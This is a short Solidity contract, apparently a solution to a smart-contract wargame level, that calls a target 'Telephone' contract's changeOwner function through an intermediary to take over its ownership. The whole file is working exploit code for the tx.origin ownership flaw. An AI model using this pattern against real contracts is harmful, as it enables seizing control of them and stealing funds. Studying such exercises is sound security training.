// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

  address public owner;
  ITelephone telephone;

  constructor(address _telephone) {
    owner = msg.sender;
    telephone = ITelephone(_telephone);
  }

  function attack() public {
    telephone.changeOwner(owner);
  }
}